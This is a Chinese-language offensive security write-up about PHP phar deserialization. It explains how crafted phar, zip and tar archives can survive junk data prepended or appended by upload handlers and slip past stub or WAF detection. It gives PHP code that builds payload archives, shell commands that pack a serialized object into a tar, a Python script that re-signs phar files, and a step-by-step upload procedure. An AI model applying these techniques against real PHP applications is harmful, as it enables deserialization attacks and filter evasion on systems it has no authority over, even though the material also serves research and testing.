0x00 前言
=======

文中主要介绍了需要触发反序列化的phar文件在`.phar`,`.zip`,`.tar`的格式下被添加脏数据的问题应该如何解决, 可以让phar文件在脏数据添加之后依旧正常触发反序列化

0x01 phar支持的格式
==============

phar文件可以是下面三种格式：

- zip
    
    .zip
    
    .phar.zip
- tar
    
    .tar
    
    .phar.tar
    
    .pahr..tar.gz
    
    .phar.tar.bz
- phar
    
    .phar
    
    .phar.bz2 `生成命令:bzip2 phar.phar`

0x02 在实战中的利用
============

1. 可以使用压缩包的方法直接将数据压缩为`zip`,`tar`,`tar.gz`,`tar.bz`从而绕过`stub`或反序列化字段的检测(zip不会压缩反序列化数据段)
2. 可以使用`.phar格式修复`的方法解决phar文件头部(使用phar)或者文件尾(使用tar)被添加脏数据的问题

> 注意:
> 
> 一以下说的`可添加脏数据`指的是即使添加了脏数据我们依旧可以在电脑正常打开这个压缩文件, 但是至于使用`java`,`php`,`python`等语言的压缩包打开方式是否可以正常解析这点并没有详细测试,不同的语言解析情况不大一样,这里主要关注的是添加脏数据后是否还能在php中被phar://正常解析

0x03 zip添加脏数据 -- 头尾均可添加脏数据但是phar无法解析
====================================

<https://github.com/phith0n/PaddingZip>

```bash
python paddingzip.py -i ../test.phar.zip -o ../test1.phar.zip --prepend "this prepend to the start" --append "this append to the end"
```

此外在readme手册中还提到可以在linux中通过以下方式添加脏数据:

```bash
$ echo -n "prepend" > f
$ cat f a.zip > b.zip
$ zip -F b.zip --out c.zip
```

在phar中的使用限制

ZIP格式的文件头尾都可以有脏字符，通过对偏移量的修复就可以重新获得一个合法的zip文件。但是否遵守这个规则，仍然取决于zip解析器，经过测试，phar解析器如果发现文件头不是zip格式，即使后面偏移量修复完成，也将触发错误

虽然zip添加不了脏数据让人大失所望,但是却在[这里](https://www.anquanke.com/post/id/240007)看到了zip却只要将phar的内容写进压缩包注释中，也同样能够反序列化，而且压缩后的zip数据也可以绕过stub检测,但是过不了反序列化数据检测(和Phar执行zip生成格式差不多,但是挺有意思的记一下吧)

```php
<?php
class test{
    public  function __wakeup(){
        var_dump(__FUNCTION__);
    }
}
$phar_file = serialize(new test());
$zip = new ZipArchive();
$res = $zip->open('justzip.zip',ZipArchive::CREATE);
$zip->addFromString('h0cksr.txt', 'file content goes here');
$zip->setArchiveComment($phar_file);
$zip->close();

readfile("phar://justzip.zip");
```

![image-20220915233156762](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-510a72b2e4e657a597b0125023b76e826c6041d5.png)

哪些场景不能解析带脏字符的zip文件呢?

1. Java -jar执行这个带脏字符的jar包时会失败
2. PHP无法解析
3. 7zip无法解析

0x04 tar添加脏数据 -- 可以在文件尾添加脏数据且phar正常解析
=====================================

**对于tar格式**，如果能控制文件头，即可构造合法的tar文件，即使文件尾有垃圾字符

这个测试的话毫无技术要求,直接使用010打开`tar`文件, 然后触发调用可以看到phar反序列化还是被正常执行了

```php
<?php
//class test{
//    public  function __wakeup(){
//        var_dump(__FUNCTION__);
//    }
//}
//$phar=new phar('test.phar');//后缀名必须为phar
//$phar = $phar->convertToExecutable(Phar::TAR);
//$phar->startBuffering();
/*$phar->setStub("<?php __HALT_COMPILER();?>");//设置stub*/
//$obj=new test();
//$phar->setMetadata($obj);//自定义的meta-data存入manifest
//$phar->addFromString("flag.txt","flag{h0cksr}");//添加要压缩的文件
////签名自动计算
//$phar->stopBuffering();
//?>
<?php
class test{
    public  function __wakeup(){
        var_dump(__FUNCTION__);
    }
}
var_dump(
    file_get_contents("compress.zlib://phar://test1.phar.tar/flag.txt")//未修改,读取数据失败,反序列化触发成功
);
var_dump(
    file_get_contents("compress.zlib://phar://test2.phar.tar/flag.txt")//文件头添加内容,读取数据失败,反序列化触发失败
);
var_dump(
    file_get_contents("compress.zlib://phar://test3.phar.tar/flag.txt")//文件尾添加内容,读取数据失败,反序列化触发成功
);
```

此外还在[使用 tar 绕过签名](https://exp10it.cn/2022/08/phar-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BB%95%E8%BF%87/#%E4%BD%BF%E7%94%A8-tar-%E7%BB%95%E8%BF%87%E7%AD%BE%E5%90%8D)看到可以直接使用打包一个只放了反序列化数据的`.metadata`文件生成的.tar压缩包可以直接用来触发反序列化

> linux环境下执行
> 
> ```bash
> mkdir test;cd test
> mkdir .phar;cd .phar
> echo 'O:4:"test":0:{}' > .metadata
> cd ../..
> tar -cf phar.tar .phar/
> ```
> 
> 生成的`phar.tar`可以直接通过`phar://phar.tar`触发反序列化

0x05 pahr文件 -- 可以在文件头添加脏数据且phar正常解析
===================================

**phar格式**，必须控制文件尾，`但不需要控制文件头`。PHP在解析时会在文件内查找`<?php __HALT_COMPILER(); ?>`这个标签，这个标签前面的内容可以为任意值，但后面的内容必须是phar格式，并以该文件的sha1签名与字符串`GBMB`结尾。

phar格式可以直接在文件头加脏数据并且还能正常反序列化, 但是这点需要重新计算一下签名, 下面就是修正签名的脚本

```python
import hashlib

with open('phar.phar', 'rb') as f:
    content = f.read()

text = content[:-28]
end = content[-8:]
sig = hashlib.sha1(text).digest()

with open('phar_new.phar', 'wb+') as f:
    f.write(text + sig + end)
```

(pahr默认使用sha1加密就是有`20字节`的签名生成结果, 在签名后面还有`8字节`,`前4字节表示文件使用的签名算法`,`最后四字节固定用于表示该文件存在签名`)

phar文件内容=数据段+签名(默认sha1有20字节大小)+签名方式(4字节)+声明文件有无签名(4字节)

除了sha1之外phar还可以使用`MD5, SHA256, SHA512, OpenSSL`生成签名

签名是前面全部`数据段`的内容根据加密算法加密得到的结果

所以当我们想要利用phar触发反序列化但是上传的文件在头部被添加了脏数据的话我们可以通过以下方法构造可利用的phar文件:

1. 先生成正常的的`.pahr`文件
2. 往文件头部添加脏数据
3. 使用上面代码改正签名
4. 使用010editor将头部的脏数据删除
5. 上传文件

0x06 文章总结
=========

1. zip格式的压缩包不能解决phar文件脏数据添加问题,但是可以解决pahr的stub检测问题
2. tar格式压缩文件既可以解决pahr文件的各种waf检测的问题, 也可以`解决phar文件尾部脏数据添加`的问题
3. phar原始格式的文件可以`解决文件头脏数据添加`的问题

0x07 其他
=======

这是在p牛说到的几点,记一下:

1. unzip命令解压时会忽略前置脏字符
2. Java解析Zip包会忽略前置脏字符
3. Python解析Zip包会忽略前置脏字符

0x08 参考
=======

<https://guokeya.github.io/post/uxwHLckwx/>

[https://exp10it.cn/2022/08/phar-签名的修复与绕过/](https://exp10it.cn/2022/08/phar-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BB%95%E8%BF%87/)

<https://www.anquanke.com/post/id/240007>

<https://blog.zsxsoft.com/post/38>

<https://github.com/phith0n/PaddingZip>

[https://wx.zsxq.com/dweb2/index/topic\_detail/185442258122142](https://wx.zsxq.com/dweb2/index/topic_detail/185442258122142)

[https://tttang.com/archive/1714/#toc\_0x06](https://tttang.com/archive/1714/#toc_0x06)